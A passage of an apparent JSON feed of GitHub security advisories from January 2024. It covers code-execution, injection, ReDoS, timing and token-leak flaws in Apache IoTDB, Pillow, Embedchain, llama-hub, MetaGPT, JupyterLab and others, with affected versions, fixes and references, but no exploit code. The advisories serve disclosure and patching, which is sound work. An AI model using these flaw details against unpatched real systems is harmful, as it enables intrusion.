                "url": "https://github.com/advisories/GHSA-hcvp-2cc7-jrwr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Remote Code Execution vulnerability in Apache IoTDB.This issue affects Apache IoTDB: from 1.0.0 through 1.2.2.</p>\n<p>Users are recommended to upgrade to version 1.3.0, which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46226\">https://nvd.nist.gov/vuln/detail/CVE-2023-46226</a></li>\n<li><a href=\"https://lists.apache.org/thread/293b4ob65ftnfwyf62fb9zh8gwdy38hg\">https://lists.apache.org/thread/293b4ob65ftnfwyf62fb9zh8gwdy38hg</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/15/1\">http://www.openwall.com/lists/oss-security/2024/01/15/1</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2024-11.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-iotdb/PYSEC-2024-11.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rxgg-273w-rfw7\">https://github.com/advisories/GHSA-rxgg-273w-rfw7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rxgg-273w-rfw7",
            "title": "[apache-iotdb] Remote Code Execution vulnerability in Apache IoTDB via UDF",
            "date_modified": "2024-01-23T00:31:55.000Z",
            "date_published": "2024-01-15T12:30:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rxgg-273w-rfw7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the <code>ecdsa.SigningKey.sign_digest()</code> API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-wj6h-64fc-37mp\">https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-wj6h-64fc-37mp</a></li>\n<li><a href=\"https://github.com/tlsfuzzer/python-ecdsa/blob/master/SECURITY.md\">https://github.com/tlsfuzzer/python-ecdsa/blob/master/SECURITY.md</a></li>\n<li><a href=\"https://minerva.crocs.fi.muni.cz/\">https://minerva.crocs.fi.muni.cz/</a></li>\n<li><a href=\"https://securitypitfalls.wordpress.com/2018/08/03/constant-time-compare-in-python/\">https://securitypitfalls.wordpress.com/2018/08/03/constant-time-compare-in-python/</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23342\">https://nvd.nist.gov/vuln/detail/CVE-2024-23342</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wj6h-64fc-37mp\">https://github.com/advisories/GHSA-wj6h-64fc-37mp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wj6h-64fc-37mp",
            "title": "[ecdsa] Minerva timing attack on P-256 in python-ecdsa",
            "date_modified": "2024-01-23T00:31:50.000Z",
            "date_published": "2024-01-22T21:35:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wj6h-64fc-37mp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When using <code>tuitse_html</code> without quoting the input, there is a html injection vulnerability. It should use the django version <code>django.utils.html.format_html</code>, instead of <code>string.format()</code></p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to version 1.3.2.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Sanitizing Taigi input with HTML quotation.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/i3thuan5/TuiTse-TsuSin/pull/22\">https://github.com/i3thuan5/TuiTse-TsuSin/pull/22</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/i3thuan5/TuiTse-TsuSin/security/advisories/GHSA-m4m5-j36m-8x72\">https://github.com/i3thuan5/TuiTse-TsuSin/security/advisories/GHSA-m4m5-j36m-8x72</a></li>\n<li><a href=\"https://github.com/i3thuan5/TuiTse-TsuSin/pull/22\">https://github.com/i3thuan5/TuiTse-TsuSin/pull/22</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23341\">https://nvd.nist.gov/vuln/detail/CVE-2024-23341</a></li>\n<li><a href=\"https://github.com/i3thuan5/TuiTse-TsuSin/commit/9d21d99d7cfcd7c42aade251fab98ec102e730ea\">https://github.com/i3thuan5/TuiTse-TsuSin/commit/9d21d99d7cfcd7c42aade251fab98ec102e730ea</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m4m5-j36m-8x72\">https://github.com/advisories/GHSA-m4m5-j36m-8x72</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m4m5-j36m-8x72",
            "title": "[TuiTse-TsuSin] html injection vulnerability in the `tuitse_html` function.",
            "date_modified": "2024-01-23T18:42:39.000Z",
            "date_published": "2024-01-22T21:32:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m4m5-j36m-8x72"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The JSON loader in Embedchain before 0.1.57 allows a ReDoS (regular expression denial of service) via a long string to json.py.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23732\">https://nvd.nist.gov/vuln/detail/CVE-2024-23732</a></li>\n<li><a href=\"https://github.com/embedchain/embedchain/pull/1122\">https://github.com/embedchain/embedchain/pull/1122</a></li>\n<li><a href=\"https://github.com/embedchain/embedchain/compare/0.1.56...0.1.57\">https://github.com/embedchain/embedchain/compare/0.1.56...0.1.57</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/embedchain/PYSEC-2024-8.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/embedchain/PYSEC-2024-8.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r67w-f99w-mgxj\">https://github.com/advisories/GHSA-r67w-f99w-mgxj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r67w-f99w-mgxj",
            "title": "[embedchain] ReDoS in Embedchain",
            "date_modified": "2024-01-22T21:29:15.000Z",
            "date_published": "2024-01-21T18:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r67w-f99w-mgxj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Pillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50447\">https://nvd.nist.gov/vuln/detail/CVE-2023-50447</a></li>\n<li><a href=\"https://devhub.checkmarx.com/cve-details/CVE-2023-50447/\">https://devhub.checkmarx.com/cve-details/CVE-2023-50447/</a></li>\n<li><a href=\"https://duartecsantos.github.io/2023-01-02-CVE-2023-50447/\">https://duartecsantos.github.io/2023-01-02-CVE-2023-50447/</a></li>\n<li><a href=\"https://github.com/python-pillow/Pillow/commit/45c726fd4daa63236a8f3653530f297dc87b160a\">https://github.com/python-pillow/Pillow/commit/45c726fd4daa63236a8f3653530f297dc87b160a</a></li>\n<li><a href=\"https://pillow.readthedocs.io/en/stable/releasenotes/10.2.0.html#security\">https://pillow.readthedocs.io/en/stable/releasenotes/10.2.0.html#security</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/20/1\">http://www.openwall.com/lists/oss-security/2024/01/20/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3f63-hfp8-52jq\">https://github.com/advisories/GHSA-3f63-hfp8-52jq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3f63-hfp8-52jq",
            "title": "[Pillow] Arbitrary Code Execution in Pillow",
            "date_modified": "2024-01-22T21:28:20.000Z",
            "date_published": "2024-01-19T21:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3f63-hfp8-52jq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The OpenAPI loader in Embedchain before 0.1.57 allows attackers to execute arbitrary code, related to the openapi.py yaml.load function argument.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23731\">https://nvd.nist.gov/vuln/detail/CVE-2024-23731</a></li>\n<li><a href=\"https://github.com/embedchain/embedchain/pull/1122\">https://github.com/embedchain/embedchain/pull/1122</a></li>\n<li><a href=\"https://github.com/embedchain/embedchain/compare/0.1.56...0.1.57\">https://github.com/embedchain/embedchain/compare/0.1.56...0.1.57</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/embedchain/PYSEC-2024-7.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/embedchain/PYSEC-2024-7.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rhhj-5436-95vf\">https://github.com/advisories/GHSA-rhhj-5436-95vf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rhhj-5436-95vf",
            "title": "[embedchain] Code execution in Embedchain",
            "date_modified": "2024-01-22T21:27:27.000Z",
            "date_published": "2024-01-21T18:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rhhj-5436-95vf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The OpenAPI and ChatGPT plugin loaders in LlamaHub (aka llama-hub) before 0.0.67 allow attackers to execute arbitrary code because safe_load is not used for YAML.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23730\">https://nvd.nist.gov/vuln/detail/CVE-2024-23730</a></li>\n<li><a href=\"https://github.com/run-llama/llama-hub/pull/841/commits/9dc9c21a5c6d0226d1d2101c3121d4f085743d52\">https://github.com/run-llama/llama-hub/pull/841/commits/9dc9c21a5c6d0226d1d2101c3121d4f085743d52</a></li>\n<li><a href=\"https://github.com/run-llama/llama-hub/blob/v0.0.67/CHANGELOG.md\">https://github.com/run-llama/llama-hub/blob/v0.0.67/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/run-llama/llama-hub/releases/tag/v0.0.67\">https://github.com/run-llama/llama-hub/releases/tag/v0.0.67</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-297x-2qf3-jrj3\">https://github.com/advisories/GHSA-297x-2qf3-jrj3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-297x-2qf3-jrj3",
            "title": "[llama-hub] Unsafe yaml deserialization in llama-hub",
            "date_modified": "2024-01-22T21:23:36.000Z",
            "date_published": "2024-01-21T18:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-297x-2qf3-jrj3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>MetaGPT through 0.6.4 allows the QaEngineer role to execute arbitrary code because RunCode.run_script() passes shell metacharacters to subprocess.Popen.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23750\">https://nvd.nist.gov/vuln/detail/CVE-2024-23750</a></li>\n<li><a href=\"https://github.com/geekan/MetaGPT/issues/731\">https://github.com/geekan/MetaGPT/issues/731</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/metagpt/PYSEC-2024-9.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/metagpt/PYSEC-2024-9.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g7ph-8423-pf4j\">https://github.com/advisories/GHSA-g7ph-8423-pf4j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g7ph-8423-pf4j",
            "title": "[metagpt] Code execution in metagpt",
            "date_modified": "2024-01-22T21:20:12.000Z",
            "date_published": "2024-01-22T03:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g7ph-8423-pf4j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in openstack-keystone, only the first 72 characters of an application secret are verified allowing attackers bypass some password complexity which administrators may be counting on. The highest threat from this vulnerability is to data confidentiality and integrity. A <a href=\"https://opendev.org/openstack/keystone/commit/7859ed26003858ebfd9a5e866b43f1a6a9e83dca\">patch</a> is available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3563\">https://nvd.nist.gov/vuln/detail/CVE-2021-3563</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2021-3563\">https://access.redhat.com/security/cve/CVE-2021-3563</a></li>\n<li><a href=\"https://bugs.launchpad.net/ossa/+bug/1901891\">https://bugs.launchpad.net/ossa/+bug/1901891</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1962908\">https://bugzilla.redhat.com/show_bug.cgi?id=1962908</a></li>\n<li><a href=\"https://security-tracker.debian.org/tracker/CVE-2021-3563\">https://security-tracker.debian.org/tracker/CVE-2021-3563</a></li>\n<li><a href=\"https://review.opendev.org/c/openstack/keystone/+/803641\">https://review.opendev.org/c/openstack/keystone/+/803641</a></li>\n<li><a href=\"https://review.opendev.org/c/openstack/keystone/+/828595\">https://review.opendev.org/c/openstack/keystone/+/828595</a></li>\n<li><a href=\"https://review.opendev.org/c/openstack/keystone/+/856489\">https://review.opendev.org/c/openstack/keystone/+/856489</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2024/01/msg00007.html\">https://lists.debian.org/debian-lts-announce/2024/01/msg00007.html</a></li>\n<li><a href=\"https://opendev.org/openstack/keystone/commit/7859ed26003858ebfd9a5e866b43f1a6a9e83dca\">https://opendev.org/openstack/keystone/commit/7859ed26003858ebfd9a5e866b43f1a6a9e83dca</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cc99-whm5-mmq3\">https://github.com/advisories/GHSA-cc99-whm5-mmq3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cc99-whm5-mmq3",
            "title": "[keystone] Openstack Keystone Incorrect Authorization vulnerability",
            "date_modified": "2024-01-22T20:25:13.000Z",
            "date_published": "2022-08-27T00:00:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cc99-whm5-mmq3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Users of JupyterLab who click on a malicious link may get their <code>Authorization</code> and <code>XSRFToken</code> tokens exposed to a third party when running an older <code>jupyter-server</code> version.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>JupyterLab 4.1.0b2, 4.0.11, and 3.6.7 were patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround has been identified, however users should ensure to upgrade <code>jupyter-server</code> to version 2.7.2 or newer which includes a redirect vulnerability fix.</p>\n<h3 id=\"references\">References</h3>\n<p>Vulnerability reported by user @davwwwx via the <a href=\"https://app.intigriti.com/programs/jupyter/jupyter/detail\">bug bounty program</a> <a href=\"https://commission.europa.eu/news/european-commissions-open-source-programme-office-starts-bug-bounties-2022-01-19_en\">sponsored by the European Commission</a> and hosted on the <a href=\"https://www.intigriti.com/\">Intigriti platform</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-44cc-43rp-5947\">https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-44cc-43rp-5947</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/1ef7a4fa0202ebdf663e1cc0b45c8813a34a0b96\">https://github.com/jupyterlab/jupyterlab/commit/1ef7a4fa0202ebdf663e1cc0b45c8813a34a0b96</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/fccd83dc4441da0384ee3fd1322c3b2d9ad4caaa\">https://github.com/jupyterlab/jupyterlab/commit/fccd83dc4441da0384ee3fd1322c3b2d9ad4caaa</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22421\">https://nvd.nist.gov/vuln/detail/CVE-2024-22421</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/19bd9b96cb2e77170a67e43121637d0b5619e8c6\">https://github.com/jupyterlab/jupyterlab/commit/19bd9b96cb2e77170a67e43121637d0b5619e8c6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cc-43rp-5947\">https://github.com/advisories/GHSA-44cc-43rp-5947</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-44cc-43rp-5947",
            "title": "[notebook] JupyterLab vulnerable to potential authentication and CSRF tokens leak",
            "date_modified": "2024-01-22T20:57:53.000Z",
            "date_published": "2024-01-19T20:28:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-44cc-43rp-5947"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Users of JupyterLab who click on a malicious link may get their <code>Authorization</code> and <code>XSRFToken</code> tokens exposed to a third party when running an older <code>jupyter-server</code> version.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>JupyterLab 4.1.0b2, 4.0.11, and 3.6.7 were patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround has been identified, however users should ensure to upgrade <code>jupyter-server</code> to version 2.7.2 or newer which includes a redirect vulnerability fix.</p>\n<h3 id=\"references\">References</h3>\n<p>Vulnerability reported by user @davwwwx via the <a href=\"https://app.intigriti.com/programs/jupyter/jupyter/detail\">bug bounty program</a> <a href=\"https://commission.europa.eu/news/european-commissions-open-source-programme-office-starts-bug-bounties-2022-01-19_en\">sponsored by the European Commission</a> and hosted on the <a href=\"https://www.intigriti.com/\">Intigriti platform</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-44cc-43rp-5947\">https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-44cc-43rp-5947</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/1ef7a4fa0202ebdf663e1cc0b45c8813a34a0b96\">https://github.com/jupyterlab/jupyterlab/commit/1ef7a4fa0202ebdf663e1cc0b45c8813a34a0b96</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/fccd83dc4441da0384ee3fd1322c3b2d9ad4caaa\">https://github.com/jupyterlab/jupyterlab/commit/fccd83dc4441da0384ee3fd1322c3b2d9ad4caaa</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22421\">https://nvd.nist.gov/vuln/detail/CVE-2024-22421</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/19bd9b96cb2e77170a67e43121637d0b5619e8c6\">https://github.com/jupyterlab/jupyterlab/commit/19bd9b96cb2e77170a67e43121637d0b5619e8c6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cc-43rp-5947\">https://github.com/advisories/GHSA-44cc-43rp-5947</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-44cc-43rp-5947",
            "title": "[jupyterlab] JupyterLab vulnerable to potential authentication and CSRF tokens leak",
            "date_modified": "2024-01-22T20:57:53.000Z",
            "date_published": "2024-01-19T20:28:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-44cc-43rp-5947"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Users of JupyterLab who click on a malicious link may get their <code>Authorization</code> and <code>XSRFToken</code> tokens exposed to a third party when running an older <code>jupyter-server</code> version.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>JupyterLab 4.1.0b2, 4.0.11, and 3.6.7 were patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround has been identified, however users should ensure to upgrade <code>jupyter-server</code> to version 2.7.2 or newer which includes a redirect vulnerability fix.</p>\n<h3 id=\"references\">References</h3>\n<p>Vulnerability reported by user @davwwwx via the <a href=\"https://app.intigriti.com/programs/jupyter/jupyter/detail\">bug bounty program</a> <a href=\"https://commission.europa.eu/news/european-commissions-open-source-programme-office-starts-bug-bounties-2022-01-19_en\">sponsored by the European Commission</a> and hosted on the <a href=\"https://www.intigriti.com/\">Intigriti platform</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-44cc-43rp-5947\">https://github.com/jupyterlab/jupyterlab/security/advisories/GHSA-44cc-43rp-5947</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/1ef7a4fa0202ebdf663e1cc0b45c8813a34a0b96\">https://github.com/jupyterlab/jupyterlab/commit/1ef7a4fa0202ebdf663e1cc0b45c8813a34a0b96</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/fccd83dc4441da0384ee3fd1322c3b2d9ad4caaa\">https://github.com/jupyterlab/jupyterlab/commit/fccd83dc4441da0384ee3fd1322c3b2d9ad4caaa</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22421\">https://nvd.nist.gov/vuln/detail/CVE-2024-22421</a></li>\n<li><a href=\"https://github.com/jupyterlab/jupyterlab/commit/19bd9b96cb2e77170a67e43121637d0b5619e8c6\">https://github.com/jupyterlab/jupyterlab/commit/19bd9b96cb2e77170a67e43121637d0b5619e8c6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cc-43rp-5947\">https://github.com/advisories/GHSA-44cc-43rp-5947</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-44cc-43rp-5947",
            "title": "[jupyterlab] JupyterLab vulnerable to potential authentication and CSRF tokens leak",
            "date_modified": "2024-01-22T20:57:53.000Z",
            "date_published": "2024-01-19T20:28:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-44cc-43rp-5947"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}